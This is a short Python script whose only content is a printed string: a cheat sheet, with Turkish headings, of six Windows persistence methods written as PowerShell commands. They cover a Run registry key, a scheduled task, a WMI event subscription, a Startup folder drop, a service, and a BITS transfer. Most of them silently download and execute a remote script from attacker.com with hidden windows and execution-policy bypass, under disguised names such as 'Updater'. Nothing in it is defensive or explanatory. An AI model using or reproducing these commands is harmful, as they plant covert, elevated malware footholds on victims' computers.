x = """


🔹 1. Run Registry Key

powershell
$payload = 'powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $payload

🔹 2. Scheduled Task (Zamanlanmış Görev)

powershell
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "UpdaterService" -Action $action -Trigger $trigger -User $env:USERNAME -RunLevel Highest -Force


🔹 3. WMI Permanent Event Subscriptio

powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "LogonTrigger"
    EventNamespace = "Root\Cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "PayloadRunner"
    CommandLineTemplate = 'powershell.exe -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(''http://attacker/payload.ps1'')"'
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

🔹 4. Startup Klasörüne Dosya Bırakma
Kullanıcı girişinde çalışan klasöre script bırakmak.

powershell
Copy-Item ".\payload.ps1" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\payload.ps1

🔹 5. Service Kaydı (Admin Gerekir)
Script’i servis gibi başlatmak.

powershell
sc.exe create "UpdaterService" binPath= "powershell.exe -w hidden -ep bypass -file C:\Windows\updater.ps1" start= auto

🔹 6. BITS Jobs (Background Intelligent Transfer Service)
Arka planda zamanlı indirme ve çalıştırma yapar.

powershell
Start-BitsTransfer -Source "http://attacker.com/payload.ps1" -Destination "$env:TEMP\payload.ps1"
schtasks /create /tn "Updater" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\payload.ps1" /sc onlogon /RL HIGHEST /F


"""
print(x)